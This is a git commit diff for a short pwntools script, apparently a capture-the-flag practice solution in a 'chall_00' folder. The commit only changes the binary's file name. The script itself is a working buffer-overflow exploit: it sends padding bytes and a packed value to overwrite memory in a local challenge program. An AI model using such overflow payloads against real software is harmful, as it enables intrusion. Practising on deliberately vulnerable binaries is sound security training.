b92d3be16cf63ddefc06ef52b53b479d749ecf7d
ajarmusch <61516473+ajarmusch@users.noreply.github.com>
2022-05-05 19:59:09 -0400

    Update 00.py

--- chall_00/00.py
+++ chall_00/00.py
@@ -1,5 +1,5 @@
 from pwn import *
-binary = context.binary = ELF('./chall_00')
+binary = context.binary = ELF('./a.out')
 p = process(binary.path)
 p.sendline((0x110-0x4)*b'A'+p32(0x69420))
 p.interactive()
